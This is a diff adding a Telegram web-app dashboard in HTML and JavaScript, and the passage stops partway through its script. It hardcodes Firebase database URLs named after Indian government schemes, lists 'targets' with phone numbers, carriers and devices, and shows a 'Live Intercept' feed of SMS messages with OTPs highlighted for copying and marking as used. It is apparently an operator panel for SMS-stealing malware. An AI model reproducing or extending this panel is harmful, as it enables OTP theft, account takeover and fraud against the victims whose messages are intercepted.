@@ -1,1 +1,791 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>X - God Mode (Auto-Purge)</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&family=JetBrains+Mono:wght@400;700&display=swap');
+
+:root {
+  --primary: #c240ff;
+  --primary-glow: #e08fff;
+  --bg-dark: #05000a;
+  --card-bg: rgba(25, 5, 45, 0.4);
+  --card-border: rgba(140, 50, 255, 0.3);
+  --text-dim: #9d8fb3;
+}
+
+html { background: var(--bg-dark); }
+
+body {
+  margin: 0; padding: 0; height: 100%; overflow: hidden;
+  font-family: 'Inter', sans-serif; color: white;
+  -webkit-tap-highlight-color: transparent; user-select: none;
+}
+
+/* ================= BACKGROUND ================= */
+body::before {
+  content: ""; position: fixed; inset: 0;
+  background-image: url("PASTE_YOUR_NEW_IMAGE_URL_HERE");
+  background-size: cover; background-position: center;
+  background-repeat: no-repeat; z-index: -2;
+  filter: brightness(0.8) contrast(1.1); 
+}
+
+body::after {
+  content: ""; position: fixed; top: 0; right: 0; width: 150vw; height: 150vw;
+  background: radial-gradient(circle at top right, rgba(160, 40, 255, 0.1), transparent 60%);
+  z-index: -1; pointer-events: none; animation: pulse 4s infinite ease-in-out alternate;
+}
+@keyframes pulse { 0% { opacity: 0.3; } 100% { opacity: 0.7; } }
+
+#cyberCanvas { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+
+/* ================= SPLASH ================= */
+#splash { position: fixed; inset: 0; display: flex; justify-content: center; align-items: center; background: var(--bg-dark); z-index: 99999; }
+#splash .logo { font-size: 50px; font-weight: 900; letter-spacing: 6px; color: #e9d5ff; text-shadow: 0 0 15px var(--primary), 0 0 40px var(--primary); animation: coreBurst 1.4s cubic-bezier(.2,1,.2,1); }
+@keyframes coreBurst { 0% { transform: scale(.5); opacity: 0; filter: blur(10px); } 70% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
+.hideSplash { animation: fadeOut 0.8s forwards; } 
+@keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+
+#optionSplash { position: fixed; inset: 0; display: none; justify-content: center; align-items: center; background: rgba(7, 0, 13, 0.85); backdrop-filter: blur(10px); z-index: 99998; }
+#optionSplash h1 { font-size: 35px; font-weight: 800; color: #e9d5ff; text-shadow: 0 0 25px var(--primary); animation: zoomIn .5s cubic-bezier(.2,1,.2,1); letter-spacing: 3px; text-transform: uppercase; }
+@keyframes zoomIn { 0% { transform: scale(.6); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+/* ================= HEADER & SEARCH ================= */
+.top-bar { display: flex; justify-content: space-between; padding: 20px 25px 5px 25px; position: relative; z-index: 100; }
+.icon-btn { width: 40px; height: 40px; border-radius: 12px; background: rgba(30, 10, 60, 0.5); border: 1px solid var(--card-border); display: flex; justify-content: center; align-items: center; color: var(--text-dim); font-size: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: 0.1s; cursor: pointer; }
+.icon-btn:active { transform: scale(0.95); }
+
+.hero { padding: 0 25px 15px 25px; position: relative; z-index: 10; display: flex; flex-direction: column; gap: 15px; }
+.hero-info p { margin: 0; font-size: 14px; color: var(--text-dim); font-weight: 400; }
+.hero-info h1 { margin: 5px 0; font-size: 42px; font-weight: 900; letter-spacing: 1px; background: linear-gradient(90deg, #ffffff, #c240ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; text-shadow: 0 0 30px rgba(194, 64, 255, 0.4); line-height: 1; }
+.hero-info .subtext { font-size: 13px; color: #7b6699; }
+.glow-line { margin-top: 15px; width: 50px; height: 3px; background: var(--primary); border-radius: 5px; box-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary); }
+
+.hero-search { width: 100%; }
+.global-search { 
+    width: 100%; box-sizing: border-box; padding: 12px 15px; border-radius: 15px; font-size: 12px; 
+    transition: 0.3s; background: rgba(10, 0, 20, 0.6); border: 1px solid rgba(140, 50, 255, 0.4); 
+    color: #fff; outline: none; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); 
+    font-family: 'Inter', sans-serif;
+}
+.global-search:focus { border-color: var(--primary-glow); box-shadow: 0 0 10px rgba(194,64,255,0.4), inset 0 0 10px rgba(0,0,0,0.5); }
+.global-search::placeholder { color: rgba(157, 143, 179, 0.6); }
+
+/* ================= SWIPE AREA ================= */
+.swipeWrap { position: relative; height: calc(100vh - 250px); width: 100%; touch-action: pan-y; z-index: 10; }
+.screen { position: absolute; width: 100%; height: 100%; padding: 0 20px; box-sizing: border-box; transition: 0.4s cubic-bezier(.25,1,.25,1); will-change: transform, opacity; overflow-y: auto; padding-bottom: 120px; }
+.screen::-webkit-scrollbar { display: none; }
+.active { transform: translateX(0); opacity: 1; z-index: 5; }
+.next { transform: translateX(100%); opacity: 0; z-index: 1; }
+.out { transform: translateX(-100%); opacity: 0; z-index: 1; }
+
+/* ================= CARDS ================= */
+.grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 20px; perspective: 1000px; }
+.grid-card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 15px; padding: 12px 8px; display: flex; flex-direction: column; align-items: center; box-shadow: inset 0 0 20px rgba(194,64,255,0.05), 0 10px 20px rgba(0,0,0,0.4); backdrop-filter: blur(10px); transform-style: preserve-3d; transition: transform 0.1s ease-out, box-shadow 0.1s ease-out; will-change: transform; }
+.grid-card:active { transform: scale(0.95) !important; }
+.grid-card::before { content: ""; position: absolute; inset: 0; border-radius: 15px; background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 50%); z-index: 1; pointer-events: none; }
+.icon-ring { width: 35px; height: 35px; border-radius: 50%; background: radial-gradient(circle, rgba(194,64,255,0.2), transparent); border: 1px solid rgba(194,64,255,0.4); display: flex; justify-content: center; align-items: center; margin-bottom: 10px; font-size: 16px; color: #fff; box-shadow: 0 0 10px rgba(194,64,255,0.3); transform: translateZ(10px); }
+.g-title { font-size: 9px; color: var(--text-dim); font-weight: 600; margin-bottom: 5px; transform: translateZ(5px); letter-spacing: 0.5px; }
+.g-val { font-size: 18px; font-weight: 800; color: #f3e8ff; text-shadow: 0 0 10px rgba(194,64,255,0.8); transform: translateZ(10px); }
+.card-bar { width: 80%; height: 3px; background: rgba(255,255,255,0.1); border-radius: 5px; margin-top: 10px; overflow: hidden; transform: translateZ(5px); }
+.card-bar-fill { height: 100%; background: var(--primary); box-shadow: 0 0 10px var(--primary); }
+
+.status-card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 18px; padding: 18px; position: relative; overflow: hidden; box-shadow: 0 10px 20px rgba(0,0,0,0.4); backdrop-filter: blur(10px); margin-bottom: 15px; cursor: pointer; transition: 0.2s; }
+.status-card:active { transform: scale(0.98); border-color: var(--primary-glow); }
+.status-card h3 { margin: 0 0 10px 0; font-size: 13px; color: var(--text-dim); font-weight: 600; }
+.status-card h2 { margin: 0 0 5px 0; font-size: 16px; color: var(--primary-glow); text-shadow: 0 0 15px var(--primary); }
+.status-card p { margin: 0; font-size: 12px; color: #7b6699; line-height: 1.5; }
+
+/* Target List Badges */
+.target-serial { position: absolute; top: 0; left: 0; background: rgba(194, 64, 255, 0.2); color: #fff; font-size: 10px; font-weight: 900; padding: 5px 15px; border-bottom-right-radius: 15px; border-top-left-radius: 15px; border-right: 1px solid var(--primary); border-bottom: 1px solid var(--primary); box-shadow: 2px 2px 10px rgba(194, 64, 255, 0.3); letter-spacing: 1px; }
+.ext-badges { position: absolute; top: 5px; right: 15px; display: flex; gap: 5px; flex-wrap: wrap; justify-content: flex-end;}
+.ext-badge { padding: 3px 8px; border-radius: 5px; font-size: 9px; font-weight: 800; border: 1px solid; }
+.bdg-used { background: rgba(255, 51, 102, 0.1); border-color: #ff3366; color: #ff3366; }
+.bdg-fav { background: rgba(255, 215, 0, 0.1); border-color: #ffd700; color: #ffd700; }
+
+/* ================= INPUT BOX ================= */
+.input-row { display: flex; flex-direction: column; align-items: flex-start; gap: 15px; cursor: default; }
+.input-row:active { transform: none; border-color: var(--card-border); }
+.input-content { width: 100%; }
+.input-action { display: flex; gap: 8px; width: 100%; }
+.cyber-input { flex: 1; padding: 10px 15px; border-radius: 10px; background: rgba(10, 0, 20, 0.6); border: 1px solid rgba(140, 50, 255, 0.5); color: #fff; font-family: 'Inter', sans-serif; font-size: 13px; outline: none; transition: 0.3s; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
+.cyber-input:focus { border-color: var(--primary-glow); box-shadow: 0 0 10px rgba(194,64,255,0.3), inset 0 0 10px rgba(0,0,0,0.5); }
+.cyber-btn { background: linear-gradient(135deg, var(--primary) 0%, #8c32ff 100%); color: #fff; border: none; padding: 0 20px; border-radius: 10px; font-weight: 800; font-size: 12px; letter-spacing: 1px; cursor: pointer; transition: 0.2s; box-shadow: 0 0 15px rgba(194, 64, 255, 0.4); }
+.cyber-btn:active { transform: scale(0.95); }
+
+/* ================= TARGETS SCREEN ================= */
+.filter-container { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; flex-wrap: wrap; }
+.filter-chip { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(140, 50, 255, 0.2); color: var(--text-dim); padding: 8px 18px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: 1px; cursor: pointer; transition: 0.3s; backdrop-filter: blur(5px); }
+.filter-chip.active { background: rgba(194, 64, 255, 0.2); border-color: var(--primary); color: #fff; box-shadow: 0 0 15px rgba(194, 64, 255, 0.3); }
+
+.target-list { height: auto; }
+.empty-state { text-align: center; color: var(--text-dim); margin-top: 30px; font-size: 13px; font-style: italic; }
+
+/* ================= SEPARATE MODAL ================= */
+.target-modal { position: fixed; inset: 0; background: rgba(5, 0, 10, 0.9); backdrop-filter: blur(15px); z-index: 10001; display: flex; flex-direction: column; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.2, 1, 0.2, 1); opacity: 0; pointer-events: none; }
+.target-modal.open { transform: translateY(0); opacity: 1; pointer-events: auto; }
+
+.modal-header { padding: 25px 20px 15px 20px; display: flex; flex-direction: column; gap: 15px; border-bottom: 1px solid var(--card-border); background: rgba(20, 5, 40, 0.5); }
+.modal-title-row { display: flex; justify-content: space-between; align-items: center; width: 100%;}
+.modal-title-area { display: flex; flex-direction: column; gap: 5px; }
+.modal-title { font-size: 20px; font-weight: 900; color: var(--primary-glow); letter-spacing: 1px; text-shadow: 0 0 15px var(--primary); margin: 0; }
+.modal-badges { display: flex; gap: 5px; }
+
+.modal-controls { display: flex; gap: 8px; align-items: center; width: 100%; overflow-x: auto; padding-bottom: 5px;}
+.modal-controls::-webkit-scrollbar { display: none; }
+.filter-sms-input { flex: 1; min-width: 100px; padding: 8px 10px; border-radius: 8px; background: rgba(0,0,0,0.6); border: 1px solid rgba(140, 50, 255, 0.4); color: #fff; font-size: 11px; font-family: 'Inter', sans-serif; outline: none; transition: 0.3s; }
+.filter-sms-input:focus { border-color: var(--primary-glow); box-shadow: 0 0 10px rgba(194, 64, 255, 0.3); }
+.filter-sms-input::placeholder { color: rgba(157, 143, 179, 0.5); }
+.set-btn { background: var(--primary); border: 1px solid var(--primary-glow); color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 10px; font-weight: 800; cursor: pointer; transition: 0.2s; box-shadow: 0 0 10px rgba(194, 64, 255, 0.3); white-space: nowrap;}
+.set-btn:active { transform: scale(0.9); }
+
+.act-btn { background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 10px; font-weight: 800; cursor: pointer; transition: 0.2s; white-space: nowrap; }
+.act-btn.used-active { background: rgba(255, 51, 102, 0.2); border-color: #ff3366; color: #ff3366; box-shadow: 0 0 10px rgba(255,51,102,0.3); }
+.act-btn.fav-active { background: rgba(255, 215, 0, 0.2); border-color: #ffd700; color: #ffd700; box-shadow: 0 0 10px rgba(255,215,0,0.3); }
+.close-modal { background: none; border: none; color: #ff3366; font-size: 28px; cursor: pointer; transition: 0.2s; line-height: 1; padding: 0; margin-left: auto;}
+.close-modal:active { transform: scale(0.9); }
+
+.modal-body { padding: 20px; flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; padding-bottom: 120px; }
+.modal-body::-webkit-scrollbar { display: none; }
+
+.info-box { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 15px; padding: 15px; display: flex; flex-direction: column; gap: 10px; box-shadow: inset 0 0 15px rgba(194,64,255,0.05); position: relative; }
+.info-row { display: flex; align-items: flex-start; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; }
+.info-row:last-child { border-bottom: none; padding-bottom: 0; }
+.info-label { font-size: 11px; color: var(--text-dim); text-transform: uppercase; font-weight: 600; margin-top: 2px;}
+
+.copy-wrap { display: flex; align-items: center; gap: 8px; }
+.info-value { font-size: 14px; color: #fff; font-weight: 800; text-align: right; word-break: break-all; }
+.info-value.dim { color: #7b6699; font-weight: 400; }
+.copy-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.15); color: #fff; border-radius: 5px; padding: 3px 6px; font-size: 11px; cursor: pointer; transition: 0.2s; display: flex; justify-content: center; align-items: center; flex-shrink: 0;}
+.copy-btn:active { background: rgba(194, 64, 255, 0.4); transform: scale(0.9); border-color: var(--primary); }
+
+.live-indicator { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); font-size: 28px; opacity: 0.05; transition: 0.2s; pointer-events: none; filter: grayscale(1); color: #fff; }
+.live-indicator.flash { opacity: 1; filter: drop-shadow(0 0 15px var(--primary-glow)) drop-shadow(0 0 30px #ffffff); transform: translate(-50%, -50%) scale(1.4); color: #ffffff; }
+
+.sms-terminal { flex: 1; background: #05000a; border: 1px solid var(--primary); border-radius: 15px; padding: 15px; display: flex; flex-direction: column; box-shadow: inset 0 0 20px rgba(0,0,0,0.8), 0 0 15px rgba(194,64,255,0.2); }
+.sms-header { font-size: 11px; color: #a3e635; font-family: 'JetBrains Mono', monospace; font-weight: 700; margin-bottom: 10px; text-transform: uppercase; border-bottom: 1px dashed rgba(163, 230, 53, 0.3); padding-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
+.clear-btn { background: rgba(255,51,102,0.1); border: 1px solid #ff3366; color: #ff3366; padding: 3px 10px; border-radius: 6px; font-size: 9px; cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: bold; transition: 0.2s;}
+.clear-btn:active { background: #ff3366; color: #fff; }
+
+.sms-feed { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; padding-right: 5px;}
+.sms-feed::-webkit-scrollbar { width: 4px; }
+.sms-feed::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+
+.msg-bubble { background: rgba(30, 10, 60, 0.8); border-left: 3px solid var(--primary-glow); padding: 10px; border-radius: 0 10px 10px 0; animation: slideIn 0.3s ease-out forwards; }
+@keyframes slideIn { from { transform: translateX(-10px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+.msg-sender { font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #a3e635; margin-bottom: 4px; font-weight: 700; }
+.msg-time { display: block; font-size: 9px; color: #7b6699; font-family: 'Inter', sans-serif; font-weight: normal; margin-top: 2px;}
+.msg-text { font-size: 12px; color: #e9d5ff; line-height: 1.4; word-break: break-word; }
+
+/* ⚡ NEW: OTP Highlight Button ⚡ */
+.otp-pill {
+    background: rgba(163, 230, 53, 0.15);
+    border: 1px solid #a3e635;
+    color: #a3e635;
+    padding: 2px 6px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 900;
+    transition: 0.2s;
+    display: inline-block;
+    margin: 0 2px;
+    box-shadow: 0 0 10px rgba(163, 230, 53, 0.2);
+}
+.otp-pill:active {
+    background: #a3e635;
+    color: #05000a;
+    transform: scale(0.9);
+}
+
+/* Radar FX */
+.radar { position: absolute; right: 10%; top: 50%; transform: translateY(-50%); width: 60px; height: 60px; }
+.radar::before, .radar::after { content: ""; position: absolute; inset: -20px; border-radius: 50%; border: 1px solid rgba(194,64,255,0.3); animation: radarPulse 3s infinite linear; }
+.radar::after { inset: -40px; border-color: rgba(194,64,255,0.1); animation-delay: 1.5s; }
+.radar-core { position: absolute; inset: 20px; background: #fff; border-radius: 50%; box-shadow: 0 0 20px #fff, 0 0 40px var(--primary); }
+@keyframes radarPulse { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
+
+/* ================= STEALTH DOCK ================= */
+.nav-container { position: fixed; bottom: 20px; width: 100%; display: flex; justify-content: center; z-index: 1000; transform: translateY(150%); transition: transform 0.4s cubic-bezier(0.2, 1, 0.2, 1); }
+.nav-container.stealth-off { transform: translateY(0); }
+.stealth-indicator { position: fixed; bottom: 8px; left: 50%; transform: translateX(-50%); width: 40px; height: 4px; background: rgba(194, 64, 255, 0.3); border-radius: 10px; transition: 0.3s; z-index: 999; pointer-events: none; }
+.nav-container.stealth-off ~ .stealth-indicator { opacity: 0; transform: translate(-50%, 20px); }
+.dock { background: rgba(15, 3, 30, 0.85); backdrop-filter: blur(10px); border: 1px solid rgba(194,64,255,0.3); border-radius: 30px; padding: 10px 20px; display: flex; gap: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.9); }
+.dock button { background: transparent; border: none; color: var(--text-dim); font-size: 20px; padding: 5px; cursor: pointer; transition: 0.3s; outline: none;}
+.dock button:active { transform: scale(0.9) translateY(-2px); }
+.dock button.active-btn { color: var(--primary-glow); text-shadow: 0 0 15px var(--primary); transform: translateY(-2px); }
+
+.nano-spark { position: fixed; width: 5px; height: 5px; background: #fff; border-radius: 50%; pointer-events: none; z-index: 99999; transform: translate(-50%, -50%) scale(0); box-shadow: 0 0 10px #fff, 0 0 18px var(--primary), 0 0 25px var(--primary); animation: nanoFlash 0.25s linear forwards; }
+@keyframes nanoFlash { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
+</style>
+</head>
+
+<body>
+
+<canvas id="cyberCanvas"></canvas>
+
+<div id="splash"><div class="logo">X CORE</div></div>
+<div id="optionSplash"><h1 id="optText">Loading</h1></div>
+
+<div class="top-bar">
+  <div class="icon-btn">≡</div>
+  <div class="icon-btn">👤</div>
+</div>
+
+<div class="hero">
+  <div class="hero-info">
+      <p>Welcome Back</p>
+      <h1>X</h1>
+      <div class="subtext">Control the energy. Master the void.</div>
+      <div class="glow-line"></div>
+  </div>
+  
+  <div class="hero-search">
+      <input type="text" id="target-search-input" class="global-search" placeholder="🔍 Search Target..." oninput="renderFilteredList(false)" onfocus="forceTargetsScreen()">
+  </div>
+</div>
+
+<div class="swipeWrap">
+
+  <div class="screen active">
+    <div class="grid-container">
+      <div class="grid-card tilt-card">
+        <div class="icon-ring">🔥</div>
+        <div class="g-title">FIREBASES</div>
+        <div class="g-val" id="dash-db-count">0</div>
+        <div class="card-bar"><div class="card-bar-fill" style="width: 100%;"></div></div>
+      </div>
+      <div class="grid-card tilt-card">
+        <div class="icon-ring">🎯</div>
+        <div class="g-title">TARGETS</div>
+        <div class="g-val" id="dash-target-count">0</div>
+        <div class="card-bar"><div class="card-bar-fill" style="width: 100%;"></div></div>
+      </div>
+      <div class="grid-card tilt-card">
+        <div class="icon-ring">⭐</div>
+        <div class="g-title">FAVOURITES</div>
+        <div class="g-val" id="dash-fav-count">0</div>
+        <div class="card-bar"><div class="card-bar-fill" style="width: 100%;"></div></div>
+      </div>
+    </div>
+    
+    <div class="status-card input-row">
+      <div class="input-content">
+        <h3>Configuration</h3>
+        <h2 style="font-size: 14px;">LINK DATABASE NODE</h2>
+        <p style="margin-top:5px; font-size:10px;">Input raw dump to extract URLs.</p>
+      </div>
+      <div class="input-action">
+        <input type="text" id="db-input-url" class="cyber-input" placeholder="Paste bulk text...">
+        <button class="cyber-btn" onclick="addDatabase()">ADD</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="screen next">
+    <div style="padding-top: 5px;">
+        <div class="filter-container">
+            <button class="filter-chip active" onclick="setFilter('GLOBAL', this)">GLOBAL</button>
+            <button class="filter-chip" onclick="setFilter('HOT', this)">HOT</button>
+            <button class="filter-chip" onclick="setFilter('UNUSED', this)">UNUSED</button>
+        </div>
+        <div class="target-list" id="targetList">
+            <div class="empty-state">No targets synced currently. Add a Database URL to start tracking.</div>
+        </div>
+    </div>
+  </div>
+
+  <div class="screen next">
+    <div class="status-card">
+      <h3>Automation</h3><h2>Payload Scripts</h2><p>Playwright and PHP Bypass modules are locked and loaded. Ready to strike.</p>
+    </div>
+  </div>
+
+  <div class="screen next">
+    <div class="status-card" style="height: calc(100vh - 350px);">
+      <h3>Terminal Operations</h3><h2>Live Injector</h2>
+      <p style="font-family: monospace; color: #a3e635; margin-top: 10px; font-size: 11px;">
+        > Root access verified.<br>> Booting modules... OK<br>> Reverse eng target... 80%<br>> Awaiting command...
+      </p>
+      <div class="radar" style="top: 25%; right: 15%; transform: scale(0.6);"><div class="radar-core"></div></div>
+    </div>
+  </div>
+
+</div>
+
+<div class="target-modal" id="targetModal">
+    <div class="modal-header">
+        <div class="modal-title-row">
+            <div class="modal-title-area">
+                <h2 class="modal-title" id="m-title">TARGET DETAILS</h2>
+                <div class="modal-badges" id="m-badges"></div>
+            </div>
+            <button class="close-modal" onclick="closeTargetModal()">&times;</button>
+        </div>
+        
+        <div class="modal-controls">
+            <input type="text" id="sms-filter-input" class="filter-sms-input" placeholder="App/OTP Filter...">
+            <button class="set-btn" onclick="applySmsFilter()">SET</button>
+            <button class="act-btn" id="btn-used" onclick="toggleUsed()">MARK USED</button>
+            <button class="act-btn" id="btn-fav" onclick="toggleFav()">⭐ FAV</button>
+        </div>
+    </div>
+    <div class="modal-body">
+        
+        <div class="info-box">
+            <div class="live-indicator" id="live-bolt">⚡</div>
+            <div class="info-row">
+                <span class="info-label">TARGET 1</span>
+                <div class="copy-wrap">
+                    <span class="info-value" id="m-sim1-num">--</span>
+                    <button class="copy-btn" onclick="copyNum('m-sim1-num', this)">📋</button>
+                </div>
+            </div>
+            <div class="info-row"><span class="info-label">CARRIER</span><span class="info-value" id="m-sim1-car">--</span></div>
+        </div>
+
+        <div class="info-box" id="m-sim2-box" style="display:none;">
+            <div class="info-row">
+                <span class="info-label">TARGET 2</span>
+                <div class="copy-wrap">
+                    <span class="info-value" id="m-sim2-num">--</span>
+                    <button class="copy-btn" onclick="copyNum('m-sim2-num', this)">📋</button>
+                </div>
+            </div>
+            <div class="info-row"><span class="info-label">CARRIER</span><span class="info-value" id="m-sim2-car">--</span></div>
+        </div>
+
+        <div class="info-box" style="padding: 10px 15px;">
+             <div class="info-row"><span class="info-label">Device</span><span class="info-value dim" id="m-model">--</span></div>
+             <div class="info-row"><span class="info-label">Cluster</span><span class="info-value dim" id="m-cluster">--</span></div>
+        </div>
+
+        <div class="sms-terminal">
+            <div class="sms-header">
+                <div>> Live Intercept_ <span id="sync-dot" style="color:#e08fff; font-size:14px; display:none;">•</span></div>
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <span id="m-sms-count">0 Msgs</span>
+                    <button class="clear-btn" onclick="clearSms()">CLEAR</button>
+                </div>
+            </div>
+            <div class="sms-feed" id="m-sms-feed"></div>
+        </div>
+
+    </div>
+</div>
+
+<div class="nav-container">
+  <div class="dock">
+    <button class="active-btn" onclick="openOption('Dashboard', 0, this)">⚡</button>
+    <button onclick="openOption('Targets', 1, this)">🛡️</button>
+    <button onclick="openOption('Injectors', 2, this)">☢️</button>
+    <button onclick="openOption('Terminal', 3, this)">💻</button>
+  </div>
+</div>
+<div class="stealth-indicator"></div>
+
+<script>
+// TG WebApp Init
+let tg; try { tg = window.Telegram?.WebApp; if(tg) tg.expand(); } catch(e) {}
+
+/* ================= LOCAL MEMORY INIT ================= */
+let usedTargets = JSON.parse(localStorage.getItem('void_used')) || [];
+let favTargets = JSON.parse(localStorage.getItem('void_fav')) || [];
+let clearedTimes = JSON.parse(localStorage.getItem('void_cleared')) || {};
+
+function saveStorage() {
+  localStorage.setItem('void_used', JSON.stringify(usedTargets));
+  localStorage.setItem('void_fav', JSON.stringify(favTargets));
+  localStorage.setItem('void_cleared', JSON.stringify(clearedTimes));
+}
+
+/* ================= ⚡ PERMANENT FIREBASES YAHAN DAAL ⚡ ================= */
+const PERMANENT_FIREBASES_TEXT = `
+  "https://parkashbhai-default-rtdb.firebaseio.com/.json",
+    "https://pk114-6e828-default-rtdb.firebaseio.com/.json",
+    "https://pk175-b429e-default-rtdb.firebaseio.com/.json",
+    "https://please-2b091-default-rtdb.firebaseio.com/.json",
+    "https://pm-india-07bhb-default-rtdb.firebaseio.com/.json",
+    "https://pm-india-07y-gu-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-01hfg-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-05jg-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-13bguh-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-13gfh-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-17hh-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-18hgu-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-21gvh-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-22f92-default-rtdb.firebaseio.com/.json",
+    "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/.json"
+`;
+
+let activeDatabases = []; 
+let globalTargetsCache = []; 
+let currentFilter = 'GLOBAL'; 
+let currentModalDid = null; 
+let livePollingActive = false;
+let activeSmsFilter = ""; 
+
+/* ================= 1. AMBIENT COSMIC DUST (LITE) ================= */
+const canvas = document.getElementById("cyberCanvas"); const ctx = canvas.getContext("2d"); let dustParticles = [];
+function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+window.addEventListener('resize', resizeCanvas); resizeCanvas();
+class CosmicDust {
+  constructor() { this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height; this.size = Math.random() * 2 + 0.5; this.speedY = Math.random() * -0.5 - 0.1; this.speedX = Math.random() * 0.4 - 0.2; this.opacity = Math.random(); this.fadeDir = Math.random() > 0.5 ? 0.01 : -0.01; }
+  update() { this.y += this.speedY; this.x += this.speedX; this.opacity += this.fadeDir; if(this.opacity >= 0.8) this.fadeDir = -0.005; if(this.opacity <= 0) { this.opacity = 0; this.fadeDir = 0.005; this.y = canvas.height + 10; this.x = Math.random() * canvas.width; } if(this.y < 0) { this.y = canvas.height + 10; this.x = Math.random() * canvas.width; } }
+  draw() { ctx.fillStyle = `rgba(194, 64, 255, ${this.opacity})`; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); ctx.shadowBlur = 10; ctx.shadowColor = "rgba(194, 64, 255, 0.8)"; }
+}
+function initDust() { dustParticles = []; let numParticles = (canvas.width * canvas.height) / 15000; for(let i=0; i<numParticles; i++) dustParticles.push(new CosmicDust()); }
+function animateDust() { ctx.clearRect(0, 0, canvas.width, canvas.height); dustParticles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animateDust); }
+initDust(); animateDust();
+
+/* ================= 2. 3D HOLOGRAM TILT (DISABLED FOR MOBILE SPEED) ================= */
+document.querySelectorAll('.tilt-card').forEach(card => {
+  const resetTilt = () => { card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`; card.style.boxShadow = `inset 0 0 20px rgba(194,64,255,0.05), 0 10px 20px rgba(0,0,0,0.4)`; };
+  card.addEventListener('pointerleave', resetTilt); card.addEventListener('pointerup', resetTilt);
+});
+
+/* ================= ⚡ COMMON RAW URL EXTRACTOR ENGINE ⚡ ================= */
+function processRawUrls(rawStr) {
+    if(!rawStr) return 0;
+    const regex = /([a-zA-Z0-9-]+)\.firebaseio\.com/gi;
+    let matches = rawStr.match(regex);
+    let addedCount = 0;
+    if (matches && matches.length > 0) {
+        let uniqueDomains = [...new Set(matches)];
+        uniqueDomains.forEach(domain => {
+            let perfectUrl = `https://${domain.toLowerCase()}/.json`;
+            if(!activeDatabases.includes(perfectUrl)) {
+                activeDatabases.push(perfectUrl);
+                addedCount++;
+            }
+        });
+    }
+    return addedCount;
+}
+
+/* ================= SPLASH REMOVER & AUTO-BOOT SYSTEM ================= */
+window.addEventListener("load", () => { 
+    setTimeout(() => { 
+        let splash = document.getElementById("splash"); 
+        if(splash) { 
+            splash.classList.add("hideSplash"); 
+            setTimeout(() => splash.remove(), 800); 
+        } 
+        
+        let bootCount = processRawUrls(PERMANENT_FIREBASES_TEXT);
+        if(bootCount > 0 || activeDatabases.length > 0) {
+            fetchAndRenderTargets(false);
+        }
+    }, 1500); 
+});
+
+/* ================= NAVIGATION & EXACT V23 SWIPE ================= */
+let screens = document.querySelectorAll(".screen"); let dockBtns = document.querySelectorAll(".dock button"); let current = 0; let isModalOpen = false;
+function openOption(name, index, btnElement) {
+  if (current === index) return; try { if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy'); } catch(e) {}
+  let rect = btnElement.getBoundingClientRect(); createNanoSpark(rect.left + rect.width / 2, rect.top + rect.height / 2);
+  let s = document.getElementById("optionSplash"); let t = document.getElementById("optText"); t.innerText = name; s.style.display = "flex";
+  setTimeout(() => { s.style.display = "none"; current = index; render(); }, 600);
+}
